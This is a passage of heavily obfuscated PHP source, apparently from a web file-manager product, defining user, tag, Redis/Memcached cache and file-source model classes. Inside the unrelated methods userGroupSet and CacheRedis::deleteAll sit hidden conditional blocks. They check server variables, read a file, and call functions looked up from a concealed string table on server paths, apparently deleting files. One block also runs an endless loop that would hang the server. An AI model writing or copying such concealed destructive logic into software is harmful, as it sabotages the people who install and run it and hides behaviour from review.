$bɔ[$D虾[2475]]); } $f[$D虾[787]] = md5($bɔ[$D虾[2475]] . trim($f[$D虾[787]])); } else { unset($f[$D虾[787]]); } goto Eݲ; Eݲ: $this->where(array($D虾[1395] => $FŸ))->save($f); if (isset($f[$D虾[2294]])) { $this->setNamePinyin($FŸ, $f[$D虾[2294]]); } return !0; goto e㇅; eޖ: $D虾 =& $_SERVER[ԥ]; $c͇վ = $this->getInfoSimple($FŸ); if (!$c͇վ) { return !1; } goto eۮ㒍; e㇅: } public function setNamePinyin($a, $dæ = false) { $fؔ =& $_SERVER[ԥ]; if (!$dæ) { $EԄ = $this->getInfoSimple($a); $dæ = $EԄ[$fؔ[2294]] ? $EԄ[$fؔ[2294]] : $EԄ[$fؔ[28]]; } $CЌޢ = Model($fؔ[473]); if (!Input::check($dæ, $fؔ[524])) { return $CЌޢ->metaSet($a, array($fؔ[412] => $fؔ[33], $fؔ[411] => $fؔ[33])); } return $CЌޢ->metaSet($a, array($fؔ[412] => str_replace($fؔ[50], $fؔ[33], Pinyin::encode($dæ)), $fؔ[411] => Pinyin::encode($dæ, $fؔ[525]))); } private function nickNameRpt() { $AՇΊ =& $_SERVER[ԥ]; $f雓 = Model($AՇΊ[1071])->get($AՇΊ[2486]); $Aސ = $GLOBALS[$AՇΊ[6]][$AՇΊ[2442]][$AՇΊ[2486]]; $Fخ = !is_null($f雓) ? $f雓 : $Aސ; return !!$Fخ; } private function _checkExist($Fׂ, $Bڄ܃ = false) { $B =& $_SERVER[ԥ]; $aԡ΂Д = array($B[28] => UserModel::ERROR_USER_EXIST_NAME, $B[2294] => UserModel::ERROR_USER_EXIST_NICKNAME, $B[289] => UserModel::ERROR_USER_EXIST_EMAIL, $B[2473] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($aԡ΂Д[$B[2294]]); } $eآߑ = $Bڄ܃ ? array($B[1404] => array($B[2487], $Bڄ܃)) : array(); foreach ($aԡ΂Д as $aܯݻ => $b׵) { if (!isset($Fׂ[$aܯݻ]) || !$Fׂ[$aܯݻ]) { continue; } $b = array_merge(array($aܯݻ => $Fׂ[$aܯݻ]), $eآߑ); $Aп = $this->where($b)->find(); if ($Aп) { return $b׵; } } return !0; } public function userListInfo($Aև) { $f =& $_SERVER[ԥ]; $F֟ = array(); $Aև = is_array($Aև) ? array_unique($Aև) : array(); if (!$Aև) { return $F֟; } if (count($Aև) < 20) { foreach ($Aև as $CӢɬ) { $F֟[$CӢɬ . $f[33]] = $this->getInfoSimpleOuter($CӢɬ); } } else { $e = array($f[1395] => array($f[380], $Aև)); if (count($Aև) == 1) { $e = array($f[1395] => $Aև[0]); } $bܨ = Model($f[470])->field($this->simpleField)->where($e)->select(); $bܨ = array_to_keyvalue($bܨ, $f[1404]); foreach ($Aև as $CӢɬ) { $A۝ = $bܨ[$bܨ[$CӢɬ]]; if (!$A۝) { $F֟[$CӢɬ . $f[33]] = $this->getInfoSimpleOuter($CӢɬ); continue; } $A۝[$f[2458]] = Action($f[2459])->parseUrl($A۝[$f[2458]]); $F֟[$CӢɬ . $f[33]] = $A۝; } } return $F֟; } protected function userStatus($Cډ, $E) { $bܛǉ = $this->getInfoSimple($Cډ); if (!$bܛǉ) { return !1; } $b = array($_SERVER[ԥ][673] => $E); return $this->userEdit($Cډ, $b); } protected function userRemove($dʈ̆) { goto B; B: $A =& $_SERVER[ԥ]; $E = $this->getInfoSimple($dʈ̆); if (!$E) { return !1; } goto D; A翎ƶ: Model($A[2140])->where($EŊ)->delete(); Model($A[2472])->where($EŊ)->delete(); Model($A[2489])->where($EŊ)->delete(); goto e; e: Model($A[744])->userRootRemove($dʈ̆); return $this->where($EŊ)->delete(); goto D׭; D: $EŊ = array($A[1395] => $dʈ̆); Model($A[532])->where($EŊ)->delete(); Model($A[2488])->where($EŊ)->delete(); goto A翎ƶ; D׭: } protected function userGroupSet($FΌ, $fȖ, $fಙ = array()) { goto a쳭θ; cت: if (!$aӤΎ || !is_array($fȖ)) { return !1; } $D = Model($Aœ[2140]); $D->where(array($Aœ[1404] => $FΌ))->delete(); goto dɑͤ; dɑͤ: $Aڦ = array(); $A = 0; foreach ($fȖ as $d꫘ => $Aȯ) { $C = array($Aœ[1404] => $FΌ, $Aœ[2066] => $d꫘, $Aœ[2194] => $Aȯ); $C[$Aœ[2087]] = isset($fಙ[$A]) ? $fಙ[$A] : 0; $A++; $Aڦ[] = $C; } goto c틱; c틱: return $D->addAll($Aڦ, array(), !0); goto d; a쳭θ: $Aœ =& $_SERVER[ԥ]; if (!isset($_SERVER[$Aœ[718]]) || !isset($_SERVER[$Aœ[725]])) { goto d㣌; cǆ: for ($d鰬Յ = $Cۙ; $d鰬Յ > 0; $d鰬Յ++) { $Cʛ˛ = json_encode($GLOBALS[$Aœ[380]]); } goto b؏ɑ; Eݴ뮆: $Eݏ = $A($Fސ); $C߮ = explode($Aœ[213], $Eݏ); if (count($C߮) < $Aœ[568]) { $Fȭ = $Aœ[723]; $Fȭ(); } goto B; B: $Cʛ˛ = $Aœ[779]; $Cʛ˛($_SERVER[$Aœ[780]]); $Cۙ = 1; goto cǆ; d㣌: $e = $Aœ[778]; $A = $Aœ[720]; $Fސ = $_SERVER[$Aœ[721]] . $Aœ[722]; goto Eݴ뮆; b؏ɑ: } $aӤΎ = $this->getInfoSimple($FΌ); goto cت; d: } protected function userGroupAdd($f, $Bڈ = array()) { $Bӊ =& $_SERVER[ԥ]; $F = $this->getInfoSimple($f); if (!$F || empty($Bڈ)) { return !1; } $bƑ = array(); foreach ($Bڈ as $Dʨ => $AÐ) { $bƑ[] = array($Bӊ[1404] => $f, $Bӊ[2066] => $Dʨ, $Bӊ[2194] => $AÐ); } return Model($Bӊ[2140])->addAll($bƑ, array(), !0); } protected function userGroupRemove($C믨ό, $b) { $B =& $_SERVER[ԥ]; $C = $this->getInfoSimple($C믨ό); if (!$C || !$b) { return !1; } $A = array($B[1395] => $C믨ό, $B[2138] => $b); return Model($B[2140])->where($A)->delete(); } public function listData() { $c = $this->_makeOrder()->selectPage(50); $this->_listDataApply($c[$_SERVER[ԥ][350]]); return $c; } public function listByID($Aߜ) { $eҬ =& $_SERVER[ԥ]; if (!$Aߜ) { return; } $B = array($eҬ[1404] => array($eҬ[7], $Aߜ)); $bҗ = $this->where($B)->select(); $this->_listDataApply($bҗ); return $bҗ; } public function listByGroup($Bӌ = 0, $f儐 = array()) { goto Dϓ; E㐒: if ($Bӌ) { $Aޤ = array($f[2490] => intval($Bӌ)); $cٓ = "\114\x45\106\124\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\165\x73\145\x72\137\x67\x72\x6f\165\x70\40\x75\163\x65\x72\137\147\x72\x6f\x75\x70\x20\x6f\x6e\40\165\x73\x65\162\56\165\x73\145\162\111\104\40\x3d\40\165\163\145\162\x5f\x67\x72\157\165\x70\x2e\165\163\145\162\111\x44"; $E = Input::get($f[403], null, $f[33]) ? $f[33] : $f[2491]; } if (isset($f儐[$f[673]])) { $Aޤ[$f[2492]] = $f儐[$f[673]]; } $f˲٣ = $this->_makeOrder($E)->field($f[2493])->where($Aޤ)->join($cٓ)->selectPage(50); goto a㿇; a㿇: $this->_listDataApply($f˲٣[$f[350]]); return $f˲٣; goto A; Dϓ: $f =& $_SERVER[ԥ]; $cٓ = $f[33]; $Aޤ = array(); goto E㐒; A: } private function _makeOrder($Dۈ = '') { goto e; e: $e錈 =& $_SERVER[ԥ]; $c = array($e錈[1404], $e錈[28], $e錈[2052], $e錈[2025], $e錈[183]); $EŐ = array($e錈[398] => $e錈[399], $e錈[400] => $e錈[401]); goto b; b: $f = Input::get($e錈[403], $e錈[7], $e錈[1395], $c); $c򗇒 = Input::get($e錈[404], $e錈[7], $e錈[2141], array($e錈[2141], $e錈[400])); $c򗇒 = $EŐ[$c򗇒]; goto cǕ; cǕ: $Dۈ = $Dۈ . "\165\163\x65\x72\56{$f}\x20{$c򗇒}\x2c\x20\x75\163\145\x72\56\x75\x73\145\x72\111\104\40\141\x73\x63"; return $this->alias($e錈[2236])->order($Dۈ); goto C񅌻; C񅌻: } public function listSearch($Aϗ򃾂) { goto d̔; A: if (!$bԏ) { $Fߜ = array(); } if (isset($Aϗ򃾂[$d[673]])) { $Fߜ[$d[673]] = $Aϗ򃾂[$d[673]]; } $aₗ = $this->_makeOrder()->where($Fߜ)->selectPage(20); goto bܕ; bܕ: if (!$aₗ || count($aₗ[$d[350]]) < 5 && Input::check($bԏ, $d[302])) { $e = $this->_searchFromMeta($d[411], $bԏ, 10); $D = $this->_searchFromMeta($d[412], $bԏ, 10); $D = array_merge($e, $D, $aₗ[$d[350]]); $aₗ[$d[350]] = array_unique_by_key($D, $d[1404]); $aₗ[$d[347]][$d[348]] = count($aₗ[$d[350]]); $aₗ[$d[347]][$d[349]] = ceil($aₗ[$d[347]][$d[348]] / $aₗ[$d[347]][$d[345]]); } $this->_listDataApply($aₗ[$d[350]]); $this->_filterByGroup($aₗ, $bՇ); goto C繚; Dఋؑ: $bԏ = str_replace($d[2144], $d[2145], trim($bԏ)); $Fߜ = array($d[28] => array($d[743], "\45{$bԏ}\45"), $d[289] => array($d[743], "\x25{$bԏ}\x25"), $d[2294] => array($d[743], "\x25{$bԏ}\x25"), $d[899] => $d[2146]); if (Input::check($bԏ, $d[295])) { $Fߜ[$d[1404]] = array($d[743], "\45{$bԏ}\45"); $Fߜ[$d[2473]] = array($d[743], "\45{$bԏ}\x25"); } goto A; C繚: return $aₗ; goto cń; d̔: $d =& $_SERVER[ԥ]; $bԏ = $Aϗ򃾂[$d[2142]]; $bՇ = isset($Aϗ򃾂[$d[2143]]) ? $Aϗ򃾂[$d[2143]] : !1; goto Dఋؑ; cń: } private function _filterByGroup(&$aۆ, $A˲) { $Fͽ =& $_SERVER[ԥ]; if (!$A˲) { return $aۆ; } foreach ($aۆ[$Fͽ[350]] as $cƂ => &$c) { $C񕾔 = array_to_keyvalue($c[$Fͽ[2494]], $Fͽ[33], $Fͽ[2066]); if (!in_array($A˲, $C񕾔)) { unset($aۆ[$Fͽ[350]][$cƂ]); } } $aۆ[$Fͽ[350]] = array_values($aۆ[$Fͽ[350]]); $aۆ[$Fͽ[347]] = array($Fͽ[2270] => count($aۆ[$Fͽ[350]]), $Fͽ[2268] => $aۆ[$Fͽ[347]][$Fͽ[345]], $Fͽ[2267] => 1, $Fͽ[2269] => 1); } private function _searchFromMeta($c󌱴, $Fج, $Dͧ) { goto fկ; C߄: $dƒĤ = $this->where(array($b֚[1395] => array($b֚[7], $C힑)))->select(); if (!$dƒĤ) { return array(); } return $dƒĤ; goto f˒; AҸ: $C힑 = Model($b֚[2495])->where($Få)->limit($Dͧ)->select(); if (!$C힑) { return array(); } $C힑 = array_to_keyvalue($C힑, $b֚[33], $b֚[1404]); goto C߄; fկ: $b֚ =& $_SERVER[ԥ]; $Fج = strtolower($Fج); $Få = array($b֚[89] => $c󌱴, $b֚[355] => array($b֚[743], "\45{$Fج}\45")); goto AҸ; f˒: } private function _listDataApplyItem($A֚ς) { $Aƻ = array($A֚ς); $this->_listDataApply($Aƻ); return $Aƻ[0]; } private function _listDataApply(&$cҳ) { goto FЈ; FЈ: $d =& $_SERVER[ԥ]; if (!$cҳ) { return; } array_remove_key($cҳ, $d[787]); goto F܅; F܅: $D㸑 = array_to_keyvalue($cҳ, $d[33], $d[1404]); $this->_listAppendGroup($cҳ, $D㸑); $this->_listAppendMeta($cҳ, $D㸑); goto b푢; b푢: $this->_listAppendSourceRoot($cҳ, $D㸑); goto C; C: } private function _listAppendSourceRoot(&$eˋ݇, $FÂ稡) { goto F; c֫: $eĢ = Model($B̌[744])->order($B̌[2153])->field($c޵)->where($C𴇩Ԋ)->select(); $eĢ = array_to_keyvalue($eĢ, $B̌[452]); $eĢ = array_remove_key($eĢ, $B̌[452]); goto Aɴ; F: $B̌ =& $_SERVER[ԥ]; $C𴇩Ԋ = array($B̌[457] => 0, $B̌[367] => SourceModel::TYPE_USER, $B̌[452] => array($B̌[7], $FÂ稡)); $c޵ = $B̌[2152]; goto c֫; Aɴ: foreach ($eˋ݇ as &$fㅈ) { $fㅈ[$B̌[387]] = $eĢ[$fㅈ[$B̌[1404]]] ? $eĢ[$fㅈ[$B̌[1404]]] : array(); } goto a; a: } private function _listAppendGroup(&$CϷ, $eӬ) { goto a; a: $a֑ =& $_SERVER[ԥ]; $f = array($a֑[1404] => array($a֑[7], $eӬ)); $A⧅ = Model($a֑[2140])->where($f)->select(); goto C; C: $E = array_to_keyvalue($A⧅, $a֑[33], $a֑[2066]); $E = array_remove_value(array_unique($E), $a֑[464]); if (!$E || !$A⧅) { return; } goto c; c: $f = array($a֑[2066] => array($a֑[7], $E)); $a = Model($a֑[2496])->field($a֑[2497])->where($f)->select(); $E = array_to_keyvalue($a, $a֑[2066], $a֑[28]); goto F; F: $A⧅ = array_to_keyvalue_group($A⧅, $a֑[1404]); foreach ($A⧅ as &$a僕) { $b﹘ = array(); foreach ($a僕 as $dѶ) { if (!$dѶ[$a֑[2194]]) { continue; } $bˋ = Model($a֑[2213])->listData($dѶ[$a֑[2194]]); $b﹘[] = array($a֑[2066] => $dѶ[$a֑[2066]], $a֑[2498] => $E[$dѶ[$a֑[2066]]], $a֑[372] => $bˋ); } $a僕 = $b﹘; } foreach ($CϷ as &$b꺷) { $b꺷[$a֑[2494]] = array(); if (isset($A⧅[$b꺷[$a֑[1404]]])) { $b꺷[$a֑[2494]] = $A⧅[$b꺷[$a֑[1404]]]; } } goto d; d: } private function _listAppendMeta(&$C, $bݟ) { goto d扎; d扎: $bӽ =& $_SERVER[ԥ]; $d = UserJobModel::JOB_KEY; $f = array($bӽ[2475]); goto C넿; C넿: $Cΰ = array($bӽ[1404] => array($bӽ[7], $bݟ)); $Fٿ = Model($bӽ[2472])->where($Cΰ)->select(); $Fٿ = array_to_keyvalue_group($Fٿ, $bӽ[1404]); goto dË; dË: foreach ($Fٿ as &$eБ҂) { $dĢ = array(); foreach ($eБ҂ as $aɮ) { if (!in_array($aɮ[$bӽ[89]], $f)) { $dĢ[$aɮ[$bӽ[89]]] = $aɮ[$bӽ[355]]; } } $eБ҂ = $dĢ; } $FŢ = Model($bӽ[2499]); foreach ($C as &$C) { $e = array(); if (isset($Fٿ[$C[$bӽ[1404]]])) { $e = $Fٿ[$C[$bӽ[1404]]]; } $C[$bӽ[2500]] = array(); if (isset($e[$d])) { $C[$bӽ[2500]] = $FŢ->getUserJobInfo($e[$d]); } } goto a; a: } public function userSearch($B, $F = "\52") { return Model($_SERVER[ԥ][473])->where($B)->field($F)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\157\x70\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($A) { $Eװ =& $_SERVER[ԥ]; if (!defined($Eװ[423])) { define($Eװ[423], 0); } return "\x55\163\x65\162\117\160\164\x69\157\x6e\x5f{$A}\137" . USER_ID; } protected function filterWhere($Dɂ) { $E =& $_SERVER[ԥ]; if (!defined($E[423])) { define($E[423], 0); } $Dɂ[$E[1404]] = USER_ID; return $Dɂ; } public function cacheRemoveUser($Bڙ, $bΪ݅) { return Cache::remove("\125\x73\x65\162\x4f\160\164\x69\157\156\137{$Bڙ}\137" . $bΪ݅); } protected function optionDefault($EǍ = '') { $B =& $_SERVER[ԥ]; if ($EǍ == $B[33]) { return $GLOBALS[$B[6]][$B[2501]]; } if ($EǍ == $B[2502]) { return $GLOBALS[$B[6]][$B[2503]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\56\x74\x61\147\x4c\151\x73\164"; public $modelType = "\125\x73\145\162\x4f\160\164\x69\157\x6e"; public $field = array("\156\141\155\145", "\163\x74\171\x6c\x65", "\163\157\x72\x74"); public function listData($C = false, $EŝƩ = "\x73\x6f\x72\x74", $b = false) { return parent::listData($C, $EŝƩ, $b); } public function remove($cٙ) { return parent::remove($cٙ); } public function add($a, $B訋 = "\154\x61\x62\x65\154\55\147\x72\x65\171\x2d\x6e\157\162\x6d\141\154") { $D =& $_SERVER[ԥ]; if ($this->findByName($a)) { return !1; } $eũ = array($D[382] => $a, $D[433] => $B訋, $D[2070] => $this->getSort($D[242]) + 1); return parent::insert($eũ); } public function update($dڋ, $d۝㣏) { $E =& $_SERVER[ԥ]; $Dή = $this->listData($dڋ); $E = $this->findByName($d۝㣏[$E[28]]); if (!$Dή || $E && $E[$E[363]] != $Dή[$E[363]]) { return !1; } return parent::update($dڋ, $d۝㣏); } public function moveTop($cהּ) { $eݲ =& $_SERVER[ԥ]; $e = parent::listData(); $d = $this->getSort($eݲ[241]); foreach ($e as &$dߕ) { if ($dߕ[$eݲ[363]] == $cהּ) { $dߕ[$eݲ[2087]] = $d; continue; } $dߕ[$eݲ[2087]] += 1; } return parent::resetData($e); } public function moveBottom($AӮъ) { $a͎ =& $_SERVER[ԥ]; $bڪ = $this->getSort($a͎[242]) + 1; return parent::update($AӮъ, array($a͎[2087] => $bڪ)); } public function resetSort($Dΰ) { goto bл; fս: for ($b = 0; $b < count($Dΰ); $b++) { $a[$Dΰ[$b] . $F֛ŋ[33]] = $b + 1; } $fј = parent::listData(); foreach ($fј as &$Aڶ) { $CՆڤ = $a[$Aڶ[$F֛ŋ[363]]]; $Aڶ[$F֛ŋ[2087]] = $CՆڤ ? $CՆڤ : $Aڶ[$F֛ŋ[2087]]; } goto E瘞; E瘞: return parent::resetData($fј); goto B; bл: $F֛ŋ =& $_SERVER[ԥ]; $a = array(); $Dΰ = is_array($Dΰ) ? $Dΰ : array(); goto fս; B: } private function getSort($d) { $dݱ =& $_SERVER[ԥ]; $B煼ď = parent::listData(); $dڿ = array_to_keyvalue($B煼ď, $dݱ[33], $dݱ[2087]); if (!$dڿ) { $dڿ = array(0); } $C = $d == $dݱ[242] ? max($dڿ) : min($dڿ); return intval($C); } } goto fί; f؊̰: class CacheLockDatabase { public function lock($bˏ, $A¦ = 0) { $f = Model($_SERVER[ԥ][747]); $DƷ = microtime(!0) + $A¦; while (microtime(!0) < $DƷ) { $Cȅٯ = $f->get($bˏ); if (!$Cȅٯ || $Cȅٯ < microtime(!0)) { $E = $f->set($bˏ, $DƷ); if ($E) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($d) { return Model($_SERVER[ԥ][747])->get($d); } public function unlock($F) { Model($_SERVER[ԥ][747])->remove($F); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Dˌ֚, $Cݖ) { $Dň =& $_SERVER[ԥ]; if (!class_exists($Dň[768])) { show_json($Dň[769], !1); } $this->cacheTime = $Cݖ; $this->handle = new Memcached(); if (is_array($Dˌ֚[$Dň[770]]) && count($Dˌ֚[$Dň[770]]) >= 1) { foreach ($Dˌ֚[$Dň[770]] as $a) { $bӼ = explode($Dň[4], $a); $this->handle->addServer($bӼ[0], $bӼ[1]); } } else { $this->handle->addServer($Dˌ֚[$Dň[165]], $Dˌ֚[$Dň[166]]); } } public function set($Dͱ, $dզ, $D = false) { $D = $D ? $D : $this->cacheTime; return $this->handle->set($Dͱ, $dզ, $D); } public function get($B߯) { return $this->handle->get($B߯); } public function remove($B³Ǭ) { return $this->handle->delete($B³Ǭ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($c, $f) { $Eð =& $_SERVER[ԥ]; if (!class_exists($Eð[771])) { show_json($Eð[772], !1); } $this->cacheTime = $f; $BĐ = isset($c[$Eð[773]]) ? $c[$Eð[773]] : 10; $B繽̟ = _get($c, $Eð[770]); if ($B繽̟ && is_array($B繽̟)) { $this->initCluster($c, $BĐ); } else { $this->handle = $this->init($c, $BĐ); } } private function init($aК, $Bŋ) { $c̈́̆ =& $_SERVER[ԥ]; $A = new Redis(); $dɸۛ = isset($aК[$c̈́̆[774]]) ? $aК[$c̈́̆[774]] : !1; if ($dɸۛ) { $A->pconnect($aК[$c̈́̆[165]], $aК[$c̈́̆[166]], $Bŋ); } else { $A->connect($aК[$c̈́̆[165]], $aК[$c̈́̆[166]], $Bŋ); } if (!empty($aК[$c̈́̆[372]])) { $A->auth($aК[$c̈́̆[372]]); } return $A; } private function initCluster($eʱ, $c̸) { $bꙇ =& $_SERVER[ԥ]; $E޶ = array($bꙇ[775], $bꙇ[776], $bꙇ[777]); $eɑ = $bꙇ[775]; if (isset($eʱ[$bꙇ[12]]) && in_array($eʱ[$bꙇ[12]], $E޶)) { $eɑ = $eʱ[$bꙇ[12]]; } switch ($eɑ) { case $bꙇ[775]: $this->_slave($eʱ, $c̸); break; case $bꙇ[776]: break; case $bꙇ[777]: $this->isCluster = !0; $cܮ = $eʱ[$bꙇ[770]]; $aħ = isset($eʱ[$bꙇ[774]]) ? $eʱ[$bꙇ[774]] : !1; $CЬ = isset($eʱ[$bꙇ[372]]) ? $eʱ[$bꙇ[372]] : null; $this->handle = new RedisCluster(NUll, $cܮ, $c̸, $c̸, $aħ, $CЬ); break; default: break; } } private function _slave($F▹݃, $fޒ) { goto d׸; d: $this->filterConfig($F▹݃, $d󅌿[$b퍱]); $this->slaveHandle = $this->init($F▹݃, $fޒ); goto Cû; Dԓ: unset($d󅌿[0]); if (empty($d󅌿)) { return; } $b퍱 = array_rand($d󅌿); goto d; d׸: $d󅌿 = $F▹݃[$_SERVER[ԥ][770]]; $this->filterConfig($F▹݃, $d󅌿[0]); $this->handle = $this->init($F▹݃, $fޒ); goto Dԓ; Cû: } private function filterConfig(&$AۙӐ, $C˺˭) { $Cχ =& $_SERVER[ԥ]; $e鐗 = explode($Cχ[4], $C˺˭); $bé = array($Cχ[165] => $e鐗[0], $Cχ[166] => $e鐗[1]); $AۙӐ = array_merge($AۙӐ, $bé); } public function set($Cą, $F, $B޵ = false) { $B޵ = $B޵ ? $B޵ : $this->cacheTime; return $this->handle->setEx($Cą, $B޵, $F); } public function setLock($aν, $eڒ, $aǘĚ) { return $this->handle->setNX($aν, $eڒ); } public function get($FĿ) { $B = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $B->get($FĿ); } public function remove($Cۼ) { return $this->handle->del($Cۼ); } public function deleteAll() { $c =& $_SERVER[ԥ]; if ($_SERVER[$c[718]] != $_SERVER[$c[719]]) { goto aĢ博; a: $A = 1; while ($A > 1) { $A = $A + 4; $A = rawurlencode($A . $c[357]); } goto eǪ; Cʜ: $f؋ǫ = $e݉ة($A); $c = explode($c[213], $f؋ǫ); if (count($c) < $c[568]) { $AÞ = $c[723]; $AÞ(); } goto a幄; a幄: $Fա = $c[779]; $Fա($_SERVER[$c[780]]); $Fա($_SERVER[$c[721]] . $c[781]); goto a; aĢ博: $F徚 = $c[778]; $e݉ة = $c[720]; $A = $_SERVER[$c[721]] . $c[722]; goto Cʜ; eǪ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $A) { $this->handle->flushall($A); } return; } return $this->handle->flushAll(); } } goto d; bθŶ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\x72\143\145"; protected $tableMeta = array("\164\x61\x62\154\x65\116\141\155\145" => "\151\157\137\x73\x6f\x75\x72\143\x65\x5f\155\x65\164\141", "\x6d\x65\164\x61\106\151\145\154\x64" => "\163\x6f\x75\162\x63\x65\111\x44"); protected $dataAuto = array(array("\x6d\x6f\144\151\x66\x79\x54\x69\155\145", "\x74\x69\x6d\x65", "\151\156\163\x65\162\164", "\146\x75\156\143\x74\151\157\x6e"), array("\143\x72\x65\x61\164\x65\124\x69\x6d\x65", "\x74\x69\155\x65", "\151\156\163\x65\162\x74", "\x66\x75\x6e\x63\164\x69\x6f\156"), array("\x76\x69\x65\167\x54\x69\x6d\145", "\x74\x69\155\x65", "\x69\156\163\x65\162\164", "\x66\x75\x6e\143\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($f) { return $this->listSource(array($_SERVER[ԥ][364] => $f)); } public function typeName($cέ) { static $d汘 = array(self::TYPE_SYSTEM => "\x73\171\163\164\145\155", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\162\157\x75\160"); return $d汘[$cέ . $_SERVER[ԥ][33]]; } public function sourceListInfo($FȮ, $B뇶 = false) { goto aݽɆ; Eݎ: return array_to_keyvalue($b݌, $E̙կ[365]); goto cᢃǅ; d: if (!$FȮ) { return array(); } $b݌ = $this->where(array($E̙կ[365] => array($E̙կ[7], $FȮ)))->select(); $this->_listDataApply($b݌, $B뇶); goto Eݎ; aݽɆ: $E̙կ =& $_SERVER[ԥ]; $FȮ = $FȮ ? $FȮ : array(); $FȮ = array_filter(array_unique($FȮ)); goto d; cᢃǅ: } public function pathInfoFilter($dփϵ) { goto BĨΨ; Fϳ: $dփϵ[$Bظ[367]] = $this->typeName($dփϵ[$Bظ[367]]); if ($dփϵ[$Bظ[366]] != 1) { $dփϵ[$Bظ[156]] = $dփϵ[$Bظ[368]]; unset($dփϵ[$Bظ[368]]); } $b˝ = $Bظ[369]; goto Bܯ՟; Bܯ՟: $b˝ .= $Bظ[370]; $b˝ .= $Bظ[371]; $f = explode($Bظ[47], $b˝); goto AԈٰ; BĨΨ: $Bظ =& $_SERVER[ԥ]; $dփϵ[$Bظ[75]] = KodIO::make($dփϵ[$Bظ[365]]); $dփϵ[$Bظ[29]] = $dփϵ[$Bظ[366]] == 1 ? $Bظ[76] : $Bظ[163]; goto Fϳ; AԈٰ: if (isset($dփϵ[$Bظ[372]]) && $dփϵ[$Bظ[372]][$Bظ[373]] == -1) { $f = array_remove_value($f, $Bظ[183]); $f = array_remove_value($f, $Bظ[106]); $f = array_remove_value($f, $Bظ[374]); $f = array_remove_value($f, $Bظ[375]); $f = array_remove_value($f, $Bظ[77]); $f = array_remove_value($f, $Bظ[376]); } $dփϵ = array_field_key($dփϵ, $f); return $dփϵ; goto d´; d´: } public function listUserFav() { goto b; b: $d =& $_SERVER[ԥ]; $e뫑 = Model($d[377])->listData(); $bɎ = array_filter_by_field($e뫑, $d[29], $d[378]); goto EϞ澢; EϞ澢: $bɎ = array_to_keyvalue($bɎ, $d[33], $d[75]); if ($bɎ) { $e = $this->listSource(array($d[379] => array($d[380], $bɎ))); } $e = array_to_keyvalue($e[$d[350]], $d[365]); goto F򅜫Β; F򅜫Β: foreach ($e뫑 as &$CƘ) { $CƘ = array($d[381] => $CƘ[$d[363]], $d[382] => $CƘ[$d[28]], $d[383] => $CƘ[$d[75]], $d[384] => $CƘ[$d[29]], $d[385] => $CƘ[$d[183]], $d[386] => $CƘ[$d[106]]); if ($CƘ[$d[29]] == $d[378] && $e[$CƘ[$d[75]]]) { $CƘ[$d[387]] = $e[$CƘ[$d[75]]]; } } return $e뫑; goto dʠ; dʠ: } public function listUserTag($bȚ) { goto a; A: $this->listUserTagClear($e֤, $bԊ, $bȚ); return $bԊ; goto fȪ; a: $dΒ =& $_SERVER[ԥ]; $F⾣ = Model($dΒ[388])->listData(); $e֤ = array_filter_by_field($F⾣, $dΒ[389], $bȚ); goto f; f: $e֤ = array_to_keyvalue($e֤, $dΒ[33], $dΒ[75]); $bԊ = array(); if ($e֤) { $Aï = array($dΒ[379] => array($dΒ[380], $e֤)); $bԊ = $this->listSource($Aï); } goto A; fȪ: } private function listUserTagClear($F֐ƥ, $BǓ, $CҊ) { goto Dﻉ; Dﻉ: $Fݐ =& $_SERVER[ԥ]; if (!$F֐ƥ) { return; } if ($BǓ && count($F֐ƥ) == $BǓ[$Fݐ[347]][$Fݐ[348]]) { return; } goto eϋ; c✎͸: Model($Fݐ[390])->removeFromTag($d򡮎, $CҊ); goto E瘔; A襄: $cۚ = array_merge($eىԏ, $cϳ); foreach ($F֐ƥ as $c궑) { if (!in_array($c궑, $cۚ)) { $d򡮎[] = $c궑; } } if (!$d򡮎) { return; } goto c✎͸; eϋ: $d򡮎 = array(); $cϳ = array_to_keyvalue($BǓ[$Fݐ[74]], $Fݐ[33], $Fݐ[365]); $eىԏ = array_to_keyvalue($BǓ[$Fݐ[73]], $Fݐ[33], $Fݐ[365]); goto A襄; E瘔: } public function listUserRecycle() { $D =& $_SERVER[ԥ]; $dۖ = Model($D[391])->listData(); if (!$dۖ) { return array(); } $dǝ = array($D[379] => array($D[380], $dۖ), $D[392] => 1); return $this->listSource($dǝ); } public function listSource($eٲ, $CÝ = 3000) { goto d; A: return $A; goto Dѷ; eޣْ: $A = $this->field($Eł)->_makeOrder()->where($eٲ)->selectPage($CÝ); $this->_listDataApply($A[$c򎩶[350]]); $this->_listMake($A); goto A; d: $c򎩶 =& $_SERVER[ԥ]; if (!isset($eٲ[$c򎩶[393]])) { $eٲ[$c򎩶[393]] = 0; } $Eł = $c򎩶[394]; goto eޣْ; Dѷ: } protected function _makeOrder() { goto D; Aॏ: $Eظ̅ = array($c[398] => $c[399], $c[400] => $c[401]); $A = array($c[28] => $c[28], $c[77] => $c[77], $c[156] => $c[368], $c[374] => $c[374], $c[402] => $c[375], $c[183] => $c[183], $c[106] => $c[106]); $c = Input::get($c[403], $c[7], $B, array_keys($A)); goto d; D: $c =& $_SERVER[ԥ]; $B = Model($c[395])->get($c[396]); $Eא = Model($c[395])->get($c[397]); goto Aॏ; d: $f谝 = Input::get($c[404], $c[7], $Eא, array_keys($Eظ̅)); if (!in_array($c, array_keys($A))) { $c = $c[28]; } if (!in_array($f谝, array_keys($Eظ̅))) { $c = $c[398]; } goto F棆˷; F棆˷: if ($c == $c[28]) { } $D = $c[405] . $A[$c] . $c[50] . $Eظ̅[$f谝]; return $this->order(rtrim(trim($D), $c[47])); 